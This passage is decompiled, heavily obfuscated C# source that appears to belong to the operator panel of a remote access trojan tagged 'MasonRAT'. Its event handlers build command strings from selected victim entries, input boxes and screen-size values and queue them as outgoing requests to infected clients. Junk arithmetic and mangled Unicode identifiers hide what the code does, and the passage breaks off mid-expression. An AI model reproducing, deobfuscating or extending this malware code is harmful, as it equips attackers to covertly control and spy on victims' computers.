        strArray[(-1545696812 - 875465711 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - (0 << 1) << 0 ^ ((1284999360 ^ 951764122 % 696406037) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - (0 + 0) + 0 | 1845823982 + (2126366091 >> 74407669) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - (0 ^ 0) ^ 0)) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ٺـڕ\u0609ٺڠـــڝـٺﻻ\u0609\u060A(0) + -0] = this.\u2694️MasonRAT\u270C\u0608\u060Dىٽ\u060Bــ؁̨ـۙۧڞ.Text;
        strArray[583108851 + ~532580134 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - (0 ^ 0) - 0 - ((50528729 ^ 16 /*0x10*/) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - -0 ^ 0) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ٺـڕ\u0609ٺڠـــڝـٺﻻ\u0609\u060A(0) << (0 >> 1)] = selectedItem.Text;
        strArray[(-1450852146 - (565813486 >> 1566037060) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - (0 ^ 0) << 0) - -(337120226 + 1149095266 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - (0 >> 1) << 0) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ٺـڕ\u0609ٺڠـــڝـٺﻻ\u0609\u060A(0) ^ -0] = Settings.\u2694️MasonRAT\u270Cۙ\u060E\u060A\u060Fڜ\u060Aڙ\u060Aﻼـ;
        strArray[-112596099 - ~112608476 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - (0 + 0) + 0 - ((260582048 > 1224600729 ? 540611818 : 405458864) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - (0 << 1) + 0 >> (-640342032 - -2065137567 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - -0 << 0)) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ٺـڕ\u0609ٺڠـــڝـٺﻻ\u0609\u060A(0) + (0 + 0)] = this.\u2694️MasonRAT\u270Cٺ\u060Dۙﻋ\u0609\u0609\u060Cּ\u060Dٽڙءﮪټڟ̍ۙ\u060D\u0608ة.Width.ToString();
        strArray[1954097388 + 1941603922 % 21965800 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - (0 + 0) + 0 - ((1962710902 ^ 14) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - -0 - 0) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ٺـڕ\u0609ٺڠـــڝـٺﻻ\u0609\u060A(0) << -0] = Settings.\u2694️MasonRAT\u270Cۙ\u060E\u060A\u060Fڜ\u060Aڙ\u060Aﻼـ;
        strArray[(-1898186685 - (2109798991 | 138023796) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - (0 >> 1) << 0) - ((1063832993 | 1399618511) - 1025488844 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - (0 >> 1) << 0) % (884028112 - (877557408 >> 868887588) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - -0 << 0) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ٺـڕ\u0609ٺڠـــڝـٺﻻ\u0609\u060A(0) << (0 >> 1)] = this.\u2694️MasonRAT\u270Cٺ\u060Dۙﻋ\u0609\u0609\u060Cּ\u060Dٽڙءﮪټڟ̍ۙ\u060D\u0608ة.Height.ToString();
        Outcoming_Requests outcomingRequests = new Outcoming_Requests(this.\u2694️MasonRAT\u270Cۭڙﻋٻ\u0609اڼۡؤﻋٻۛدﻋـ, Helper.\u2694️MasonRAT\u270Cڟڙ\u060Dٺ\u060B\u0608ـگــڛـ\u060Eـ(string.Concat(strArray)));
        Pending.\u2694️MasonRAT\u270Cۙـ\u060A\u0608\u060Fئـ̍\u0609ּٸ\u0020ۜ\u060A\u060F.Add(outcomingRequests);
        this.\u2694️MasonRAT\u270Cٺ\u060Dۙﻋ\u0609\u0609\u060Cּ\u060Dٽڙءﮪټڟ̍ۙ\u060D\u0608ة.Visible = true;
      }
    }
    catch (Exception ex)
    {
      ProjectData.SetProjectError(ex);
      Debug.WriteLine(ex.Message);
      ProjectData.ClearProjectError();
    }
  }

  private void \u2694️MasonRAT\u270C\u060D\u060Aڅدــڇ\u0020بٻڅ\u0608\u0608\u060F\u060D(
    object sender,
    EventArgs e)
  {
    string DefaultResponse1 = \u2694️MasonRAT\u270Cڙـ\u0609ټــ\u060Cٺ\u060D\u060A\u0609\u0609؁ڼ.ـٺﯧـڅ\u060Dـ\u060B̍ــٽ\u060Aــبټ(\u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــ\u060E\u060Eٸـڙـ\u060Aةـۧـ̍ٻـ, 333);
    string str1 = Interaction.InputBox(\u2694️MasonRAT\u270Cڙـ\u0609ټــ\u060Cٺ\u060D\u060A\u0609\u0609؁ڼ.ـٺﯧـڅ\u060Dـ\u060B̍ــٽ\u060Aــبټ(\u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــ\u060E\u060Eٸـڙـ\u060Aةـۧـ̍ٻـ, 334), \u2694️MasonRAT\u270Cڙـ\u0609ټــ\u060Cٺ\u060D\u060A\u0609\u0609؁ڼ.ـٺﯧـڅ\u060Dـ\u060B̍ــٽ\u060Aــبټ(\u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــ\u060E\u060Eٸـڙـ\u060Aةـۧـ̍ٻـ, 335), DefaultResponse1, ((599764840 ^ 14) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - (0 << 1) >> 0) - ((378617320 ^ 1986469469 % 1606477423) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - -0 << 0 | (1823886714 > 193526121 ? 598519139 : 798025518) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - (0 >> 1) << 0) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ٺـڕ\u0609ٺڠـــڝـٺﻻ\u0609\u060A(0) - (0 + 0), ((133668314 > 502890495 ? -14 : -11) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - (0 ^ 0) - 0 ^ 1349924513 % 584897965 - 180128573 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - (0 >> 1) >> 0) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ٺـڕ\u0609ٺڠـــڝـٺﻻ\u0609\u060A(0) ^ 0 >> 1);
    string DefaultResponse2 = \u2694️MasonRAT\u270Cڙـ\u0609ټــ\u060Cٺ\u060D\u060A\u0609\u0609؁ڼ.ـٺﯧـڅ\u060Dـ\u060B̍ــٽ\u060Aــبټ(\u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــ\u060E\u060Eٸـڙـ\u060Aةـۧـ̍ٻـ, 336);
    string str2 = Interaction.InputBox(\u2694️MasonRAT\u270Cڙـ\u0609ټــ\u060Cٺ\u060D\u060A\u0609\u0609؁ڼ.ـٺﯧـڅ\u060Dـ\u060B̍ــٽ\u060Aــبټ(\u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــ\u060E\u060Eٸـڙـ\u060Aةـۧـ̍ٻـ, 337), \u2694️MasonRAT\u270Cڙـ\u0609ټــ\u060Cٺ\u060D\u060A\u0609\u0609؁ڼ.ـٺﯧـڅ\u060Dـ\u060B̍ــٽ\u060Aــبټ(\u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــ\u060E\u060Eٸـڙـ\u060Aةـۧـ̍ٻـ, 338), DefaultResponse2, ((171667119 ^ ~171667131) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - (0 << 1) + 0 ^ (1550813368 | 1616674353) - 2088763045 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - (0 >> 1) - 0) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ٺـڕ\u0609ٺڠـــڝـٺﻻ\u0609\u060A(0) - -0, (1979968524 + 251931700 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - (0 >> 1) << 0) + ((-908791502 ^ -248293476) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - (0 + 0) << 0 | 309612592 + 1082290567 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - (0 << 1) ^ 0) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ٺـڕ\u0609ٺڠـــڝـٺﻻ\u0609\u060A(0) + (0 >> 1));
    if (str1.Length == 0 | str2.Length == 0)
      return;
    string[] strArray = new string[455578846 + (1522472233 >> 745063296) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - (0 ^ 0) + 0 + -(-613912469 - 1703003754 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - -0 + 0) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ٺـڕ\u0609ٺڠـــڝـٺﻻ\u0609\u060A(0) + (0 ^ 0)];
    strArray[0] = \u2694️MasonRAT\u270Cڙـ\u0609ټــ\u060Cٺ\u060D\u060A\u0609\u0609؁ڼ.ـٺﯧـڅ\u060Dـ\u060B̍ــٽ\u060Aــبټ(\u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــ\u060E\u060Eٸـڙـ\u060Aةـۧـ̍ٻـ, 339);
    strArray[1] = Settings.\u2694️MasonRAT\u270Cۙ\u060E\u060A\u060Fڜ\u060Aڙ\u060Aﻼـ;
    strArray[((615457537 ^ ~2104548604) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - (0 << 1) >> 0 ^ 1865724488 + -742972695 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - (0 >> 1) >> 0 << (1364034740 - (1098894079 >> 1877779666) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - (0 ^ 0) >> 0)) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ٺـڕ\u0609ٺڠـــڝـٺﻻ\u0609\u060A(0) - (0 ^ 0)] = str1;
    strArray[(54542 - (1786587134 >> 326709647) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - (0 >> 1) >> 0 ^ (22 ^ 1209110780 >> 650986046) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - (0 << 1) - 0) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ٺـڕ\u0609ٺڠـــڝـٺﻻ\u0609\u060A(0) << (0 >> 1)] = Settings.\u2694️MasonRAT\u270Cۙ\u060E\u060A\u060Fڜ\u060Aڙ\u060Aﻼـ;
    strArray[((2038138387 | 272723461) - 2124955050 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - (0 >> 1) >> 0) + (1512438461 + 49852423 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - (0 >> 1) >> 0) % (-583093523 - -2058594368 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - (0 + 0) - 0) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ٺـڕ\u0609ٺڠـــڝـٺﻻ\u0609\u060A(0) - (0 ^ 0)] = this.\u2694️MasonRAT\u270C\u0608\u060Dىٽ\u060Bــ؁̨ـۙۧڞ.Text;
    strArray[(-818051246 - -1352486937 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - (0 ^ 0) >> 0 > (1090847856 > 1637451172 ? 1713276046 : 1284957035) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - (0 ^ 0) >> 0 ? 1152917667 % 45386681 - 18250636 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - (0 ^ 0) + 0 : (510870145 ^ 1889748420 % 1378878272) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - (0 << 1) + 0) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ٺـڕ\u0609ٺڠـــڝـٺﻻ\u0609\u060A(0) + (0 ^ 0)] = str2;
    Outcoming_Requests outcomingRequests = new Outcoming_Requests(this.\u2694️MasonRAT\u270Cۭڙﻋٻ\u0609اڼۡؤﻋٻۛدﻋـ, Helper.\u2694️MasonRAT\u270Cڟڙ\u060Dٺ\u060B\u0608ـگــڛـ\u060Eـ(string.Concat(strArray)));
    Pending.\u2694️MasonRAT\u270Cۙـ\u060A\u0608\u060Fئـ̍\u0609ּٸ\u0020ۜ\u060A\u060F.Add(outcomingRequests);
  }

  private void \u2694️MasonRAT\u270C\u0609\u0020ڛـ\u060D\u0608\u0608ۏ\u060B\u060Dﻋ(
    object sender,
    EventArgs e)
  {
    if (!Settings.\u2694️MasonRAT\u270Cـب\u060Aۧڇ\u060Eﻼﻋد\u060Bــ\u060Dـ\u060A\u060A)
    {
      int num = (int) MessageBox.Show(\u2694️MasonRAT\u270Cڙـ\u0609ټــ\u060Cٺ\u060D\u060A\u0609\u0609؁ڼ.ـٺﯧـڅ\u060Dـ\u060B̍ــٽ\u060Aــبټ(\u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــ\u060E\u060Eٸـڙـ\u060Aةـۧـ̍ٻـ, 340), \u2694️MasonRAT\u270Cڙـ\u0609ټــ\u060Cٺ\u060D\u060A\u0609\u0609؁ڼ.ـٺﯧـڅ\u060Dـ\u060B̍ــٽ\u060Aــبټ(\u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــ\u060E\u060Eٸـڙـ\u060Aةـۧـ̍ٻـ, 341), (MessageBoxButtons) ((1 ^ (143991412 ^ 1331439987 % 593724289) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - (0 >> 1) << 0) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ٺـڕ\u0609ٺڠـــڝـٺﻻ\u0609\u060A(0) ^ 0 << 1));
      Settings.\u2694️MasonRAT\u270Cـب\u060Aۧڇ\u060Eﻼﻋد\u060Bــ\u060Dـ\u060A\u060A = true;
      if (num == (869473725 - (1100981933 | 1282067873) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - (0 >> 1) << 0) - -((-830825168 ^ -732541753) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - (0 + 0) << 0) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ٺـڕ\u0609ٺڠـــڝـٺﻻ\u0609\u060A(0) - (0 << 1))
        return;
    }
    try
    {
      foreach (ListViewItem selectedItem in this.\u2694️MasonRAT\u270Cڙ\u060B\u060E\u060Fـ\u060Dـــ\u060Fټــــۧۨ.SelectedItems)
      {
        string[] strArray = new string[(107919048 - -1685929284 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - (0 ^ 0) >> 0 > (-1382660171 ^ -1424883289) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - (0 ^ 0) + 0 ? (16 /*0x10*/ ^ 22) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - -0 >> 0 : -782670772 - ~782670779 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - (0 + 0) + 0) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ٺـڕ\u0609ٺڠـــڝـٺﻻ\u0609\u060A(0) ^ 0 + 0];
        strArray[0] = \u2694️MasonRAT\u270Cڙـ\u0609ټــ\u060Cٺ\u060D\u060A\u0609\u0609؁ڼ.ـٺﯧـڅ\u060Dـ\u060B̍ــٽ\u060Aــبټ(\u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــ\u060E\u060Eٸـڙـ\u060Aةـۧـ̍ٻـ, 342);
        strArray[1] = Settings.\u2694️MasonRAT\u270Cۙ\u060E\u060A\u060Fڜ\u060Aڙ\u060Aﻼـ;
        strArray[(-2099382908 - ~1442731474 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - (0 << 1) << 0) + (1877899953 - 1221248518 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - (0 << 1) - 0) % ((2144990231 ^ 909626891 % 2005488114) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - (0 + 0) - 0) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ٺـڕ\u0609ٺڠـــڝـٺﻻ\u0609\u060A(0) ^ 0 << 1] = Settings.\u2694️MasonRAT\u270C\u0608ا\u060Fـ\u0608ــټدּ\u060A\u060F;
        strArray[((55818065 | 1410803350) - 827832276 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - (0 ^ 0) << 0) + ((-1619570025 ^ -746633734) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - (0 + 0) - 0 << ((2076708732 | 109003729) - 712067812 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - (0 >> 1) >> 0)) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ٺـڕ\u0609ٺڠـــڝـٺﻻ\u0609\u060A(0) - -0] = Settings.\u2694️MasonRAT\u270Cۙ\u060E\u060A\u060Fڜ\u060Aڙ\u060Aﻼـ;
        strArray[((314085850 > 1569399451 ? -2034709914 : 1695193037) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - (0 << 1) << 0 > -2026148379 - 1434657517 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - (0 >> 1) >> 0 ? 1073741828 /*0x40000004*/ - (1912583976 << 1638732603) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - -0 >> 0 : 755231992 - 755231987 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - (0 + 0) >> 0) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ٺـڕ\u0609ٺڠـــڝـٺﻻ\u0609\u060A(0) ^ 0 + 0] = this.\u2694️MasonRAT\u270C\u0608\u060Dىٽ\u060Bــ؁̨ـۙۧڞ.Text;
        strArray[(281248150 - 659382602 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - (0 + 0) >> 0) + (~1702687301 - 890703531 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - (0 << 1) >> 0) % (847499179 - (266349643 << 1591455470) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - (0 >> 1) << 0) + 